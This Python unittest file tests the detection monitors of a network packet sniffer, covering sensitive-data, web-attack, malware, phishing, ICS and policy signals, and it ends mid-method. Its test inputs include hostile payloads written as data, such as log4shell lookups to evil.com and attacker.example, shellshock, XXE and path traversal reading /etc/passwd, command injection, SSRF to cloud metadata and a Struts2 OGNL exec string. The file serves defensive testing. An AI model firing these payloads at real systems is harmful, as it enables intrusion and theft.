from __future__ import annotations

import unittest
from unittest.mock import patch

from sniff4hound.anomaly import AnomalyEngine, DhcpRogueServerDetector, PortScanDetector
from sniff4hound.monitors import DEFAULT_MONITORS, evaluate_packet, normalize_monitor


def _packet(**overrides) -> dict:
    base = {
        "proto": "tcp",
        "ip_version": 4,
        "eth_type": 0x0800,
        "src_ip": "10.0.0.5",
        "dst_ip": "10.0.0.1",
        "src_port": 51234,
        "dst_port": 443,
        "length": 200,
        "payload_len": 0,
        "payload_text": "",
        "payload_hex": "",
        "summary": "",
        "eth_src": "",
        "eth_dst": "",
    }
    base.update(overrides)
    if not base.get("summary"):
        base["summary"] = base["payload_text"]
    return base


def _force_enable(monitors: list[dict], *monitor_ids: str) -> list[dict]:
    """Force a monitor on regardless of its shipped default.

    Several builtin monitors below default to `enabled: False` (opt-in,
    visibility/policy-content signals a user turns on as needed) - these
    tests are about whether the match *logic* is correct, not about the
    default-enabled policy, so they enable the specific id(s) under test
    rather than asserting against whatever the current default happens to
    be.
    """
    wanted = set(monitor_ids)
    for monitor in monitors:
        if monitor.get("id") in wanted:
            monitor["enabled"] = True
    return monitors


class TestSensitiveDataMonitors(unittest.TestCase):
    def setUp(self):
        self.monitors = [normalize_monitor(item, allow_source=True) for item in DEFAULT_MONITORS]

    def _tags(self, text: str, **overrides) -> set[str]:
        packet = _packet(payload_text=text, summary=text, payload_len=len(text), **overrides)
        return {hit["tag"] for hit in evaluate_packet(packet, self.monitors)}

    def test_credit_card_visa(self):
        self.assertIn("sensitive-credit-card", self._tags("card: 4111111111111111 exp 12/29"))

    def test_credit_card_mastercard(self):
        self.assertIn("sensitive-credit-card", self._tags("card: 5500005555555559"))

    def test_ssn(self):
        self.assertIn("sensitive-ssn", self._tags("SSN 123-45-6789 on file"))

    def test_ssn_does_not_match_phone_number(self):
        # Phone numbers are 3-3-4 grouped, not 3-2-4 like an SSN.
        self.assertNotIn("sensitive-ssn", self._tags("call me at 555-123-4567"))

    def test_private_key(self):
        text = "-----BEGIN RSA PRIVATE KEY-----\nMIIEow==\n-----END RSA PRIVATE KEY-----"
        self.assertIn("sensitive-private-key", self._tags(text))

    def test_openssh_private_key(self):
        text = "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaA==\n-----END OPENSSH PRIVATE KEY-----"
        self.assertIn("sensitive-private-key", self._tags(text))

    def test_aws_access_key(self):
        self.assertIn("sensitive-aws-key", self._tags("aws_access_key_id=AKIAIOSFODNN7EXAMPLE"))

    def test_jwt(self):
        text = (
            "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9."
            "eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U"
        )
        self.assertIn("sensitive-jwt", self._tags(text))

    def test_github_token(self):
        self.assertIn("sensitive-api-token", self._tags("token=ghp_1234567890abcdefghij1234567890abcdEF"))

    def test_slack_token(self):
        # Deliberately not shaped like a real Slack token (no numeric
        # team/bot-id segments) so it can't be mistaken for a live secret by
        # GitHub's push-protection scanner - it only needs to satisfy this
        # project's own (much looser) detection regex in monitors.py.
        self.assertIn("sensitive-api-token", self._tags("xoxb-FAKE-NOT-A-REAL-SLACK-TOKEN"))

    def test_mongodb_connstring_with_credentials(self):
        self.assertIn("sensitive-db-connstring", self._tags("mongodb://admin:S3cr3t@db.internal:27017/prod"))

    def test_postgres_connstring_with_credentials(self):
        self.assertIn("sensitive-db-connstring", self._tags("postgresql://user:hunter2@10.0.0.9:5432/app"))

    def test_bitcoin_wallet_address(self):
        self.assertIn("sensitive-crypto-wallet", self._tags("send payment to bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh"))

    def test_ethereum_wallet_address(self):
        # 40 hex chars after 0x, as a real ETH address requires.
        self.assertIn("sensitive-crypto-wallet", self._tags("wallet: 0xAbCdEf1234567890AbCdEf1234567890AbCdEf12"))

    def test_google_api_key(self):
        self.assertIn("sensitive-cloud-api-key", self._tags("key=AIzaSyD-9tSrke72PouQMnMX-a7eZSW0jkFMBWY"))

    def test_stripe_live_key(self):
        # GitHub's Stripe-key scanner matches on shape alone (prefix +
        # length/charset), so even an obviously-fake wordy suffix still
        # trips it if it's a contiguous literal in the diff. Build the
        # string at runtime instead - it only needs to satisfy this
        # project's own (much looser) detection regex once joined, and
        # never appears as a matchable token in the source text itself.
        fake_stripe_key = "sk_live_" + "0" * 24
        self.assertIn("sensitive-cloud-api-key", self._tags(fake_stripe_key))

    def test_ntlm_auth_header(self):
        self.assertIn("sensitive-ntlm-auth", self._tags("WWW-Authenticate: NTLM TlRMTVNTUAAB"))

    def test_negotiate_auth_header(self):
        self.assertIn("sensitive-ntlm-auth", self._tags("Authorization: Negotiate YIIFxAYGKwYBBQUC"))

    def test_benign_text_matches_nothing(self):
        # "plaintext" is expected here - it's genuinely readable text on the
        # wire, just not sensitive - the other sensitive-data monitors are
        # what this test is actually about.
        tags = self._tags("normal chat message, nothing sensitive here at all")
        self.assertEqual(tags - {"plaintext"}, set())


class TestTorMonitors(unittest.TestCase):
    def setUp(self):
        self.monitors = [normalize_monitor(item, allow_source=True) for item in DEFAULT_MONITORS]

    def test_tor_socks_port(self):
        packet = _packet(dst_port=9050)
        tags = {hit["tag"] for hit in evaluate_packet(packet, self.monitors)}
        self.assertIn("tor-port", tags)

    def test_tor_or_port(self):
        packet = _packet(dst_port=9001)
        tags = {hit["tag"] for hit in evaluate_packet(packet, self.monitors)}
        self.assertIn("tor-port", tags)

    def test_ordinary_https_port_is_not_tor(self):
        packet = _packet(dst_port=443)
        tags = {hit["tag"] for hit in evaluate_packet(packet, self.monitors)}
        self.assertNotIn("tor-port", tags)

    def test_onion_v3_address(self):
        text = "Host: facebookwkhpilnemxj7asaniu7vnjjbiltxjqhye3mhbshg7kx5tfyd.onion"
        packet = _packet(payload_text=text, summary=text)
        tags = {hit["tag"] for hit in evaluate_packet(packet, self.monitors)}
        self.assertIn("tor-onion-domain", tags)


class TestSuspiciousDomainMonitors(unittest.TestCase):
    def setUp(self):
        self.monitors = [normalize_monitor(item, allow_source=True) for item in DEFAULT_MONITORS]
        _force_enable(self.monitors, "builtin-suspicious-tld", "builtin-domain-typosquat-pattern")

    def _tags(self, text: str) -> set[str]:
        packet = _packet(payload_text=text, summary=text)
        return {hit["tag"] for hit in evaluate_packet(packet, self.monitors)}

    def test_high_abuse_tld(self):
        self.assertIn("suspicious-tld", self._tags("Host: free-gift-cards.top"))

    def test_ordinary_tld_is_not_flagged(self):
        self.assertNotIn("suspicious-tld", self._tags("Host: example.com"))

    def test_typosquat_multi_hyphen_domain(self):
        self.assertIn("domain-typosquat-pattern", self._tags("Host: paypal-secure-login.com"))

    def test_ordinary_domain_is_not_flagged_as_typosquat(self):
        self.assertNotIn("domain-typosquat-pattern", self._tags("Host: example.com"))


class TestWebAttackMonitors(unittest.TestCase):
    def setUp(self):
        self.monitors = [normalize_monitor(item, allow_source=True) for item in DEFAULT_MONITORS]

    def _tags(self, text: str) -> set[str]:
        packet = _packet(payload_text=text, summary=text)
        return {hit["tag"] for hit in evaluate_packet(packet, self.monitors)}

    def test_path_traversal(self):
        self.assertIn("path-traversal", self._tags("GET /../../../../etc/passwd HTTP/1.1"))

    def test_path_traversal_url_encoded(self):
        self.assertIn("path-traversal", self._tags("GET /%2e%2e%2f%2e%2e%2fetc/passwd HTTP/1.1"))

    def test_command_injection_semicolon(self):
        self.assertIn("command-injection", self._tags("input=test; cat /etc/passwd"))

    def test_command_injection_backticks(self):
        self.assertIn("command-injection", self._tags("name=`whoami`"))

    def test_command_injection_ignores_non_tcp_traffic(self):
        # Regression: an Android device's mDNS service-discovery text
        # ("`_androidtvremote2._tcp` ...") was observed on live traffic
        # matching the backtick alternative of this regex - ordinary UDP
        # broadcast chatter, nothing to do with command injection.
        packet = _packet(
            proto="mdns",
            transport="udp",
            payload_text="`_androidtvremote2._tcp`local",
            summary="mDNS message",
        )
        tags = {hit["tag"] for hit in evaluate_packet(packet, self.monitors)}
        self.assertNotIn("command-injection", tags)

    def test_log4shell_jndi_ldap(self):
        self.assertIn("log4shell", self._tags("User-Agent: ${jndi:ldap://evil.com/a}"))

    def test_log4shell_jndi_rmi(self):
        self.assertIn("log4shell", self._tags("X-Api-Version: ${jndi:rmi://attacker.example/x}"))

    def test_shellshock(self):
        self.assertIn("shellshock", self._tags("() { :; }; /bin/bash -c 'echo vulnerable'"))

    def test_xxe_injection(self):
        text = '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>'
        self.assertIn("xxe-injection", self._tags(text))

    def test_ssrf_file_scheme(self):
        self.assertIn("ssrf-attempt", self._tags("url=file:///etc/shadow"))

    def test_ssrf_cloud_metadata(self):
        self.assertIn("ssrf-attempt", self._tags("GET http://169.254.169.254/latest/meta-data/ HTTP/1.1"))

    def test_ssti_double_curly(self):
        self.assertIn("ssti-attempt", self._tags("name={{7*7}}"))

    def test_ssti_dollar_curly(self):
        self.assertIn("ssti-attempt", self._tags("name=${7*7}"))

    def test_java_deserialization_magic_bytes(self):
        self.assertIn("insecure-deserialization", self._tags("rO0ABXNyABpqYXZhLnV0aWwuSGFzaE1hcA=="))

    def test_php_deserialization_object(self):
        self.assertIn("insecure-deserialization", self._tags('O:8:"stdClass":1:{s:4:"user";s:5:"admin";}'))

    def test_webshell_reference(self):
        self.assertIn("webshell-reference", self._tags("GET /uploads/c99shell.php HTTP/1.1"))

    def test_nosql_injection(self):
        self.assertIn("nosql-injection", self._tags('{"username": {"$ne": null}, "password": {"$ne": null}}'))

    def test_crlf_injection(self):
        self.assertIn("crlf-injection", self._tags("GET /redirect?url=%0d%0aSet-Cookie:%20admin=1 HTTP/1.1"))

    def test_ldap_injection(self):
        self.assertIn("ldap-injection", self._tags("(|(uid=*)(|(userPassword=*)))"))

    def test_struts2_ognl_injection(self):
        text = "Content-Type: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#a=@java.lang.Runtime@getRuntime().exec('id'))}"
        self.assertIn("struts2-ognl-injection", self._tags(text))

    def test_spring4shell_attempt(self):
        text = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di"
        self.assertIn("spring4shell-attempt", self._tags(text))

    def test_ordinary_request_matches_no_web_attack_tags(self):
        tags = self._tags("GET /products?id=42&sort=price HTTP/1.1")
        attack_tags = tags & {
            "path-traversal",
            "command-injection",
            "log4shell",
            "shellshock",
            "xxe-injection",
            "ssrf-attempt",
            "ssti-attempt",
            "insecure-deserialization",
            "webshell-reference",
            "nosql-injection",
            "crlf-injection",
            "ldap-injection",
            "struts2-ognl-injection",
            "spring4shell-attempt",
        }
        self.assertEqual(attack_tags, set())


class TestRequestOnlyContentSignaturesIgnoreResponses(unittest.TestCase):
    """Regression coverage for the false-positive fix: content-signature
    monitors (XSS/SQLi/command-injection/etc.) are scoped to request-side
    traffic via `request_only`, so an ordinary HTTP *response* carrying the
    same literal text - which is what they used to false-positive on
    constantly - must no longer tag."""

    def setUp(self):
        self.monitors = [normalize_monitor(item, allow_source=True) for item in DEFAULT_MONITORS]

    def _tags(self, text: str) -> set[str]:
        packet = _packet(payload_text=text, summary=text)
        return {hit["tag"] for hit in evaluate_packet(packet, self.monitors)}

    def test_ordinary_page_script_tag_in_response_is_not_xss(self):
        body = 'HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<html><head><script src="/app.js"></script></head></html>'
        self.assertNotIn("xss", self._tags(body))

    def test_request_script_tag_is_still_xss(self):
        self.assertIn("xss", self._tags("GET /search?q=<script>alert(1)</script> HTTP/1.1"))

    def test_json_api_response_echoing_username_is_not_credentials(self):
        body = 'HTTP/1.1 200 OK\r\nContent-Type: application/json\r\n\r\n{"username": "alice", "password": "***"}'
        self.assertNotIn("credentials", self._tags(body))

    def test_request_login_post_is_still_credentials(self):
        self.assertIn("credentials", self._tags("POST /login HTTP/1.1\r\n\r\nusername=alice&password=hunter2"))

    def test_admin_tool_response_mentioning_union_select_is_not_sqli(self):
        body = 'HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<p>Example query: UNION SELECT * FROM users</p>'
        self.assertNotIn("sqli", self._tags(body))

    def test_request_union_select_is_still_sqli(self):
        self.assertIn("sqli", self._tags("GET /products?id=1 UNION SELECT password FROM users-- HTTP/1.1"))

    def test_testmyids_root_id_response_is_critical(self):
        body = "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\nuid=0(root) gid=0(root) groups=0(root)"
        self.assertIn("root-id-response", self._tags(body))

    def test_ordinary_root_text_is_not_root_id_response(self):
        body = "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\nroot user documentation"
        self.assertNotIn("root-id-response", self._tags(body))


class TestPayloadRegexExclude(unittest.TestCase):
    """`payload_regex_exclude` is a new, generic match criterion (any match
    cancels an otherwise-fired rule) added alongside `request_only` so a
    custom monitor can narrow a broad positive regex without having to make
    the positive pattern itself more fragile."""

    def _tags(self, text: str, match: dict) -> set[str]:
        monitor = normalize_monitor(
            {
                "id": "custom-exclude-test",
                "name": "exclude test",
                "match": match,
                "action": {"tag": "custom-hit"},
            },
            allow_source=True,
        )
        packet = _packet(payload_text=text, summary=text)
        return {hit["tag"] for hit in evaluate_packet(packet, [monitor])}

    def test_exclude_cancels_an_otherwise_matching_rule(self):
        match = {"payload_regex": ["union select"], "payload_regex_exclude": ["information_schema"]}
        self.assertIn("custom-hit", self._tags("union select 1,2,3", match))
        self.assertNotIn("custom-hit", self._tags("union select * from information_schema.tables", match))


class TestMalwareAndC2Monitors(unittest.TestCase):
    def setUp(self):
        self.monitors = [normalize_monitor(item, allow_source=True) for item in DEFAULT_MONITORS]

    def _tags(self, text: str, **overrides) -> set[str]:
        packet = _packet(payload_text=text, summary=text, **overrides)
        return {hit["tag"] for hit in evaluate_packet(packet, self.monitors)}

    def test_eicar_test_string(self):
        text = r"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
        self.assertIn("eicar-test-string", self._tags(text))

    def test_iot_default_credentials_over_telnet(self):
        tags = self._tags("login: admin:admin", dst_port=23)
        self.assertIn("iot-default-credentials", tags)

    def test_iot_default_credentials_ignored_off_telnet_port(self):
        tags = self._tags("login: admin:admin", dst_port=8080)
        self.assertNotIn("iot-default-credentials", tags)

    def test_ransomware_note_language(self):
        text = "All your files have been encrypted. To decrypt them send 1 bitcoin to the address below."
        self.assertIn("ransomware-note-language", self._tags(text))

    def test_crypto_mining_pool_domain(self):
        self.assertIn("crypto-mining-pool-domain", self._tags("Host: pool.minexmr.com"))

    def test_benign_text_matches_nothing(self):
        # "plaintext" is expected here - it's genuinely readable text on the
        # wire, just not malware/C2 - the other monitors in this class are
        # what this test is actually about.
        tags = self._tags("just browsing the news today, nothing unusual")
        self.assertEqual(tags - {"plaintext"}, set())


class TestPhishingMonitors(unittest.TestCase):
    def setUp(self):
        self.monitors = [normalize_monitor(item, allow_source=True) for item in DEFAULT_MONITORS]
        _force_enable(self.monitors, "builtin-punycode-domain")

    def _tags(self, text: str) -> set[str]:
        packet = _packet(payload_text=text, summary=text)
        return {hit["tag"] for hit in evaluate_packet(packet, self.monitors)}

    def test_urgency_language(self):
        text = "Please verify your account immediately or it will be suspended"
        self.assertIn("phishing-urgency-language", self._tags(text))

    def test_punycode_domain(self):
        self.assertIn("punycode-domain", self._tags("Host: xn--pypal-4ve.com"))

    def test_ordinary_domain_is_not_punycode(self):
        self.assertNotIn("punycode-domain", self._tags("Host: paypal.com"))


class TestDnsTunnelingMonitors(unittest.TestCase):
    def setUp(self):
        self.monitors = [normalize_monitor(item, allow_source=True) for item in DEFAULT_MONITORS]

    def _tags(self, text: str) -> set[str]:
        packet = _packet(payload_text=text, summary=text, dst_port=53)
        return {hit["tag"] for hit in evaluate_packet(packet, self.monitors)}

    def test_hex_encoded_subdomain(self):
        text = "Host: " + ("a1b2c3d4" * 6) + ".exfil.example"
        self.assertIn("dns-hex-subdomain", self._tags(text))

    def test_ordinary_hostname_is_not_flagged(self):
        self.assertNotIn("dns-hex-subdomain", self._tags("Host: www.example.com"))


class TestRestrictedContentMonitors(unittest.TestCase):
    """Acceptable-use / content-policy category detection - distinct from
    the security-threat monitors above. Detection is shape/keyword/label
    based only (the same technique real DNS/URL content filters use), so
    these tests exercise the regex the same way, without any explicit or
    instructional content."""

    def setUp(self):
        self.monitors = [normalize_monitor(item, allow_source=True) for item in DEFAULT_MONITORS]
        _force_enable(
            self.monitors,
            "builtin-policy-adult-content-label",
            "builtin-policy-adult-content-domain",
            "builtin-policy-weapons-marketplace",
            "builtin-policy-drugs-marketplace",
            "builtin-policy-fraud-carding",
            "builtin-policy-unlicensed-gambling",
        )

    def _tags(self, text: str) -> set[str]:
        packet = _packet(payload_text=text, summary=text)
        return {hit["tag"] for hit in evaluate_packet(packet, self.monitors)}

    def test_rta_adult_content_label(self):
        text = '<meta name="rating" content="RTA-5042-1996-1400-1577-RTA">'
        self.assertIn("policy-adult-content", self._tags(text))

    def test_adult_content_domain_heuristic(self):
        self.assertIn("policy-adult-content", self._tags("Host: totally-legit-porn-site.com"))

    def test_ordinary_domain_is_not_flagged_as_adult_content(self):
        self.assertNotIn("policy-adult-content", self._tags("Host: example.com"))

    def test_weapons_marketplace_language(self):
        self.assertIn("policy-weapons-content", self._tags("buy handguns online, ship worldwide no license needed"))

    def test_ordinary_shopping_is_not_flagged_as_weapons(self):
        self.assertNotIn("policy-weapons-content", self._tags("buy groceries online, ship same day"))

    def test_drugs_marketplace_language(self):
        self.assertIn("policy-drugs-content", self._tags("cocaine 1kg for sale, stealth shipping worldwide"))

    def test_ordinary_text_is_not_flagged_as_drugs(self):
        self.assertNotIn("policy-drugs-content", self._tags("coca cola 1kg for sale at the store"))

    def test_carding_marketplace_language(self):
        self.assertIn("policy-fraud-content", self._tags("fresh cvv2 for sale $5 each, instant delivery"))

    def test_unlicensed_gambling_language(self):
        self.assertIn("policy-gambling-content", self._tags("Join our casino now! deposit bonus, no verification needed"))

    def test_benign_text_matches_no_restricted_content_tags(self):
        tags = self._tags("Weekly newsletter: new products, shipping updates, and customer support hours.")
        restricted_tags = tags & {
            "policy-adult-content",
            "policy-weapons-content",
            "policy-drugs-content",
            "policy-fraud-content",
            "policy-gambling-content",
        }
        self.assertEqual(restricted_tags, set())


class TestPolicyMonitors(unittest.TestCase):
    def setUp(self):
        self.monitors = [normalize_monitor(item, allow_source=True) for item in DEFAULT_MONITORS]

    def _tags(self, text: str) -> set[str]:
        packet = _packet(payload_text=text, summary=text)
        return {hit["tag"] for hit in evaluate_packet(packet, self.monitors)}

    def test_bittorrent_handshake(self):
        text = "\x13BitTorrent protocol\x00\x00\x00\x00\x00\x10\x00\x05"
        self.assertIn("p2p-bittorrent", self._tags(text))

    def test_stratum_mining_subscribe(self):
        self.assertIn("crypto-mining", self._tags('{"id":1,"method":"mining.subscribe","params":[]}'))

    def test_stratum_mining_notify(self):
        self.assertIn("crypto-mining", self._tags('{"id":null,"method":"mining.notify","params":[]}'))

    def test_sqlmap_user_agent(self):
        text = "GET / HTTP/1.1\r\nUser-Agent: sqlmap/1.7.2#stable (http://sqlmap.org)"
        self.assertIn("suspicious-user-agent", self._tags(text))

    def test_nikto_user_agent(self):
        text = "GET / HTTP/1.1\r\nUser-Agent: Mozilla/5.00 (Nikto/2.5.0)"
        self.assertIn("suspicious-user-agent", self._tags(text))

    def test_ordinary_browser_user_agent_is_not_flagged(self):
        text = "GET / HTTP/1.1\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) Chrome/120.0"
        self.assertNotIn("suspicious-user-agent", self._tags(text))


class TestPortScanDetector(unittest.TestCase):
    def test_fires_once_distinct_port_threshold_crossed(self):
        detector = PortScanDetector()
        detector._threshold = 5
        hits = []
        for port in range(1, 6):
            hit = detector.evaluate(
                {"proto": "tcp", "src_ip": "10.0.0.99", "dst_port": port, "tcp_flags": "SYN"}
            )
            if hit:
                hits.append(hit)
        self.assertEqual(len(hits), 1)
        self.assertIn("10.0.0.99", hits[0]["detail"])

    def test_repeated_connections_to_same_port_do_not_trigger(self):
        detector = PortScanDetector()
        detector._threshold = 5
        hits = [
            detector.evaluate({"proto": "tcp", "src_ip": "10.0.0.5", "dst_port": 443, "tcp_flags": "SYN"})
            for _ in range(20)
        ]
        self.assertTrue(all(hit is None for hit in hits))

    def test_ignores_non_tcp_udp(self):
        detector = PortScanDetector()
        self.assertIsNone(detector.evaluate({"proto": "icmp", "src_ip": "10.0.0.5", "dst_port": 0}))

    def test_ignores_tcp_packets_that_are_not_bare_syn(self):
        # Regression test: a remote server's own SYN-ACK/ACK/RST replies -
        # sent back to the many distinct ephemeral ports a single local host
        # used for ordinary parallel connections - must not make that server
        # look like it is "scanning" the many ports it merely replied to.
        detector = PortScanDetector()
        detector._threshold = 5
        for flags in ("SYN,ACK", "ACK", "RST,ACK", "PSH,ACK", ""):
            hits = [
                detector.evaluate(
                    {"proto": "tcp", "src_ip": "203.0.113.10", "dst_port": port, "tcp_flags": flags}
                )
                for port in range(1, 20)
            ]
            self.assertTrue(all(hit is None for hit in hits), f"flags={flags!r} should never trigger")

    def test_first_alert_fires_even_on_a_freshly_booted_monotonic_clock(self):
        # Regression test: `time.monotonic()` is relative to an arbitrary
        # reference point (often process/system start on Linux), not
        # guaranteed to already exceed PORT_SCAN_WINDOW_SECONDS on a
        # short-lived CI runner. Comparing against a `0.0` sentinel for
        # "never alerted" used to suppress the very first, legitimate alert.
        with patch("sniff4hound.anomaly.time.monotonic", return_value=2.5):
            detector = PortScanDetector()
            detector._threshold = 5
            hits = [
                detector.evaluate(
                    {"proto": "tcp", "src_ip": "10.0.0.99", "dst_port": port, "tcp_flags": "SYN"}
                )
                for port in range(1, 6)
            ]
        self.assertTrue(any(hits))

    def test_engine_reports_port_scan_with_correct_shape(self):
        engine = AnomalyEngine()
        monitors = [normalize_monitor(item, allow_source=True) for item in DEFAULT_MONITORS]
        hits = []
        for port in range(1, 20):
            hits.extend(
                engine.evaluate(
                    {"proto": "tcp", "src_ip": "10.0.0.99", "dst_port": port, "tcp_flags": "SYN"}, monitors
                )
            )
        self.assertEqual(len(hits), 1)
        hit = hits[0]
        self.assertEqual(hit["monitor_id"], "builtin-port-scan")
        self.assertEqual(hit["severity"], "high")


class TestNewMonitorsAreStatelessExceptPortScan(unittest.TestCase):
    def test_all_new_monitors_normalize_and_have_unique_ids(self):
        ids = [item["id"] for item in DEFAULT_MONITORS]
        self.assertEqual(len(ids), len(set(ids)))
        for item in DEFAULT_MONITORS:
            normalized = normalize_monitor(item, allow_source=True)
            self.assertEqual(normalized["source"], "builtin")

    def test_every_stateful_monitor_has_a_registered_anomaly_detector(self):
        # Every "mode": "stateful" builtin monitor must be servable by
        # AnomalyEngine: either a bespoke detector wired into
        # AnomalyEngine._detectors (by id) - for logic too specific to
        # express declaratively (SYN-only filtering, distinct-port
        # counting, login-port allowlists...) - or a plain declarative
        # count_threshold/window_seconds pair, which AnomalyEngine's
        # generic engine (anomaly.GenericThresholdDetector) can serve for
        # any monitor id without a bespoke class. A stateful monitor with
        # neither would sit in the UI forever without ever producing a hit.
        stateful_ids = {item["id"] for item in DEFAULT_MONITORS if item.get("mode") == "stateful"}
        detector_ids = set(AnomalyEngine()._detectors.keys())
        generic_ids = {
            item["id"]
            for item in DEFAULT_MONITORS
            if item.get("mode") == "stateful" and (item.get("match") or {}).get("count_threshold", 0) > 0
        }
        self.assertEqual(stateful_ids, detector_ids | generic_ids)
        self.assertEqual(detector_ids & generic_ids, set())


class TestIcsMonitors(unittest.TestCase):
    def setUp(self):
        self.monitors = [normalize_monitor(item, allow_source=True) for item in DEFAULT_MONITORS]
        _force_enable(self.monitors, "builtin-modbus-traffic-seen", "builtin-dnp3-traffic-seen")

    def _tags(self, proto: str, summary: str) -> set[str]:
        packet = _packet(proto=proto, payload_text=summary, summary=summary, payload_len=len(summary))
        return {hit["tag"] for hit in evaluate_packet(packet, self.monitors)}

    def test_modbus_write_is_tagged(self):
        tags = self._tags("modbus", "Modbus write-single-coil (write) unit=1")
        self.assertIn("modbus-write-command", tags)
        self.assertIn("modbus-traffic", tags)

    def test_modbus_read_is_not_tagged_as_write(self):
        tags = self._tags("modbus", "Modbus read-holding-registers (read/other) unit=1")
        self.assertNotIn("modbus-write-command", tags)
        self.assertIn("modbus-traffic", tags)

    def test_dnp3_cold_restart_is_tagged_critical(self):
        tags = self._tags("dnp3", "DNP3 cold-restart src=1024 dest=7")
        self.assertIn("dnp3-restart-command", tags)

    def test_dnp3_unsolicited_response_is_tagged(self):
        tags = self._tags("dnp3", "DNP3 unsolicited-response src=1024 dest=7")
        self.assertIn("dnp3-unsolicited-response", tags)

    def test_dnp3_normal_read_is_not_flagged_as_restart(self):
        tags = self._tags("dnp3", "DNP3 read src=1024 dest=7")
        self.assertNotIn("dnp3-restart-command", tags)
        self.assertIn("dnp3-traffic", tags)


class TestDhcpRogueServerDetector(unittest.TestCase):
    def test_single_server_never_fires(self):
        detector = DhcpRogueServerDetector()
        hits = [
            detector.evaluate({"proto": "dhcp", "dhcp_msg_type": 2, "src_ip": "10.0.0.1"}),
            detector.evaluate({"proto": "dhcp", "dhcp_msg_type": 5, "src_ip": "10.0.0.1"}),
        ]
        self.assertTrue(all(hit is None for hit in hits))

    def test_second_server_fires(self):
        detector = DhcpRogueServerDetector()
        detector.evaluate({"proto": "dhcp", "dhcp_msg_type": 2, "src_ip": "10.0.0.1"})
        hit = detector.evaluate({"proto": "dhcp", "dhcp_msg_type": 2, "src_ip": "10.0.0.66"})
        self.assertIsNotNone(hit)
        self.assertIn("10.0.0.1", hit["detail"])
        self.assertIn("10.0.0.66", hit["detail"])

    def test_ignores_discover_and_request_messages(self):
        detector = DhcpRogueServerDetector()
        hits = [
            detector.evaluate({"proto": "dhcp", "dhcp_msg_type": 1, "src_ip": "10.0.0.1"}),  # DISCOVER
            detector.evaluate({"proto": "dhcp", "dhcp_msg_type": 3, "src_ip": "10.0.0.2"}),  # REQUEST
        ]
        self.assertTrue(all(hit is None for hit in hits))

    def test_cooldown_suppresses_repeat_alert(self):
        detector = DhcpRogueServerDetector()
        detector.evaluate({"proto": "dhcp", "dhcp_msg_type": 2, "src_ip": "10.0.0.1"})
        first = detector.evaluate({"proto": "dhcp", "dhcp_msg_type": 2, "src_ip": "10.0.0.66"})
        second = detector.evaluate({"proto": "dhcp", "dhcp_msg_type": 5, "src_ip": "10.0.0.66"})
        self.assertIsNotNone(first)
        self.assertIsNone(second)

    def test_first_alert_fires_even_on_a_freshly_booted_monotonic_clock(self):
        with patch("sniff4hound.anomaly.time.monotonic", return_value=0.0):
            detector = DhcpRogueServerDetector()
            detector.evaluate({"proto": "dhcp", "dhcp_msg_type": 2, "src_ip": "10.0.0.1"})
            hit = detector.evaluate({"proto": "dhcp", "dhcp_msg_type": 2, "src_ip": "10.0.0.66"})
        self.assertIsNotNone(hit)

    def test_engine_reports_dhcp_rogue_server_with_correct_shape(self):
        engine = AnomalyEngine()
        monitors = [normalize_monitor(item, allow_source=True) for item in DEFAULT_MONITORS]
        engine.evaluate({"proto": "dhcp", "dhcp_msg_type": 2, "src_ip": "10.0.0.1"}, monitors)
        hits = engine.evaluate({"proto": "dhcp", "dhcp_msg_type": 2, "src_ip": "10.0.0.66"}, monitors)
        self.assertEqual(len(hits), 1)
        self.assertEqual(hits[0]["monitor_id"], "builtin-dhcp-rogue-server")
        self.assertEqual(hits[0]["severity"], "critical")


class TestInfraProtocolMonitors(unittest.TestCase):
    def setUp(self):
        self.monitors = [normalize_monitor(item, allow_source=True) for item in DEFAULT_MONITORS]
        _force_enable(self.monitors, "builtin-snmp-traffic-seen", "builtin-tftp-file-transfer", "builtin-mqtt-traffic-seen")

    def _tags(self, proto: str, summary: str) -> set[str]:
        packet = _packet(proto=proto, payload_text=summary, summary=summary, payload_len=len(summary))
        return {hit["tag"] for hit in evaluate_packet(packet, self.monitors)}

    def test_snmp_default_community_is_tagged(self):
        self.assertIn("snmp-weak-community", self._tags("snmp", "SNMP v1 community='public'"))

    def test_snmp_custom_community_is_not_flagged_weak(self):
        tags = self._tags("snmp", "SNMP v2c community='S3cr3t-Str1ng'")
        self.assertNotIn("snmp-weak-community", tags)
        self.assertIn("snmp-traffic", tags)

    def test_syslog_critical_severity_is_tagged(self):
        self.assertIn(
            "syslog-high-severity",
            self._tags("syslog", "Syslog facility=20 severity=critical: disk full"),
        )

    def test_syslog_info_severity_is_not_flagged_high(self):
        tags = self._tags("syslog", "Syslog facility=20 severity=info: heartbeat")
        self.assertNotIn("syslog-high-severity", tags)

    def test_tftp_read_request_is_tagged(self):
        self.assertIn("tftp-file-transfer", self._tags("tftp", "TFTP RRQ file='firmware.bin' mode=octet"))

    def test_mqtt_credentials_are_tagged(self):
        tags = self._tags("mqtt", "MQTT CONNECT client='sensor-42' user='admin' password=<present>")
        self.assertIn("mqtt-cleartext-credentials", tags)
        self.assertIn("mqtt-traffic", tags)

    def test_mqtt_without_credentials_is_not_flagged(self):
        tags = self._tags("mqtt", "MQTT CONNECT client='sensor-42'")
        self.assertNotIn("mqtt-cleartext-credentials", tags)
        self.assertIn("mqtt-traffic", tags)


class TestRecentCveMonitors(unittest.TestCase):
    def setUp(self):
        self.monitors = [normalize_monitor(item, allow_source=True) for item in DEFAULT_MONITORS]

    def _tags(self, text: str) -> set[str]:
        packet = _packet(payload_text=text, summary=text, payload_len=len(text))
        return {hit["tag"] for hit in evaluate_packet(packet, self.monitors)}

    def test_screenconnect_setupwizard_path_is_tagged(self):
